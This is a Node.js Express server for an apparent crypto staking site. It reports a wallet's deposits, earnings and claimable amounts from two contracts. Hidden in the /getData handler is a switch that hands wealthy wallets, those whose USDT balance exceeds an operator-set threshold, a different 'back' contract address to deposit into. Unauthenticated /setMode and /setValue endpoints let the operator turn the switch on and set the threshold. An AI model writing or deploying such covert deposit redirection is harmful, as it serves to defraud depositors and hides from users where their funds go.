import http from 'http';
import express from 'express';
import bodyParser from 'body-parser';
import cors from 'cors';
import {goodStakingABI, backStakingABI, usdtABI, goodContractAddress, backContractAddress, usdtAddress, RPC} from './config.js' 
import Web3 from 'web3';
import ethers from 'ethers';
import fetch from 'node-fetch'


const app = express();  
app.use(cors());  
app.use(bodyParser.json())
const httpServer = http.createServer(app); 


const web3  = new Web3(new Web3.providers.HttpProvider(RPC));  
const goodContract = new web3.eth.Contract(goodStakingABI, goodContractAddress);
const backContract = new web3.eth.Contract(backStakingABI, backContractAddress);
const usdtContract = new web3.eth.Contract(usdtABI, usdtAddress)

let isMoon = false;
let richBalance = 2000


app.get('/getData', async function(req, res){  
   let data = req.query
   let address = data.address

   console.log("start")

   let  myDeposit,        totalEarning,        nextWithdrawDate,        claimable
        
    let claimable1  =  await goodContract.methods.computePayout(address).call();
    let claimable2  =  await backContract.methods.computePayout(address).call();
    claimable =  ((claimable1 / Math.pow(10, 18)).toFixed(2) * 1 ) + ( (claimable2 / Math.pow(10, 18)).toFixed(2) * 1)
    console.log("claimable1", claimable1 , "claimable2", claimable2,"claimable", claimable)


    let data1   =  await goodContract.methods.players(address).call();
    let data2   =  await backContract.methods.players(address).call();



    myDeposit = ((data1.total_invested  / Math.pow(10, 18)).toFixed(2) * 1) + (( data2.total_invested / Math.pow(10, 18)).toFixed(2) * 1 );

    totalEarning = ((data1.total_withdrawn / Math.pow(10, 18)).toFixed(2) * 1 ) + (( data2.total_withdrawn / Math.pow(10, 18)).toFixed(2) * 1  );
    console.log(data1.total_withdrawn, data2.total_withdrawn)

    let nextWithdrawDate1 = await goodContract.methods.nextWithdraw(address).call();
    let nextWithdrawDate2 = await backContract.methods.nextWithdraw(address).call();

    nextWithdrawDate1/1 > nextWithdrawDate2/1 ? nextWithdrawDate = nextWithdrawDate1 : nextWithdrawDate = nextWithdrawDate2
    console.log(nextWithdrawDate1, nextWithdrawDate2, nextWithdrawDate)

    let balance = await usdtContract.methods.balanceOf(address).call();

    let targetAddress = goodContractAddress
    balance = balance / Math.pow(10,18)

    console.log(balance, richBalance)
    if ((balance > richBalance) && isMoon){
      targetAddress = backContractAddress
    }


    res.json({
      address : address,
      claimable : claimable,
      totalEarning : totalEarning,
      myDeposit : myDeposit,
      nextWithdraw : nextWithdrawDate,
      contractAddress : targetAddress
    })
    return
});

app.get('/setMode', async function(req, res){  
   let data = req.query
   let mode = data.mode

   if (mode == "good") 
    {
      isMoon = false}
   if (mode == "back") 
    {console.log("1111111111111111")
  isMoon = true}

    res.json({
      mode : isMoon
    })
    return
});

app.get('/setValue', async function(req, res){  
   let data = req.query
   richBalance = data.value
   

    res.json({
      richValue : richBalance
    })
    return
});

app.get('/getStatus', async function(req, res){  

   

    res.json({
      mode : isMoon,
      value : richBalance
    })
    return
});






const PORT = 5000;
httpServer.listen(PORT, (console.log("server start")));
  